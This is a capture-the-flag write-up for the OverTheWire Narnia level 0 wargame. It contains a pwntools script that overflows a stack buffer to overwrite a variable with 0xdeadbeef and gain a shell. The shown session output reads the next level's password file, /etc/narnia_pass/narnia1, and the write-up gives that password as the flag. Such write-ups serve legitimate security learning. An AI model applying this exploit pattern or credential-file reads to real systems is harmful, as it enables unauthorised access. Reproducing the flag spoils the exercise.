# LEVEL GOAL

There is no information for this level, intentionally.

# HINTS

None

# SOLUTION

Code:
```
from pwn import *

remote_ssh = ssh('narnia0', 'narnia.labs.overthewire.org', password='narnia0', port=2226)
log.info("Connected to narnia.labs.overthewire.org")

io = remote_ssh.process('sh', shell=True)

payload = pack(3735928559)
exploit = "A"*20 + payload
log.info("Cannon ready")

io.sendline('/narnia/narnia0')
io.sendline(exploit)

io.interactive()
remote_ssh.close()
```

Output:
```
nikhilh@ubuntu:~/overthewire/narnia/level0$ python auth.py 
[+] Connecting to narnia.labs.overthewire.org on port 2226: Done
[*] narnia0@narnia.labs.overthewire.org:
    Distro    Devuan 2.0
    OS:       linux
    Arch:     amd64
    Version:  4.18.12
    ASLR:     Disabled
[*] Connected to narnia.labs.overthewire.org
[+] Starting remote process '/bin/sh' on narnia.labs.overthewire.org: pid 4675
[*] Cannon ready
[*] Switching to interactive mode
$ Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
$ $ cat /etc/narnia_pass/narnia1
efeidiedae
$ $ exit
$ $ exit
[*] Got EOF while reading in interactive
$ exit
[*] Stopped remote process 'dash' on narnia.labs.overthewire.org (pid 4675)
[*] Got EOF while sending in interactive
[*] Closed connection to 'narnia.labs.overthewire.org'
```

# FLAG

efeidiedae
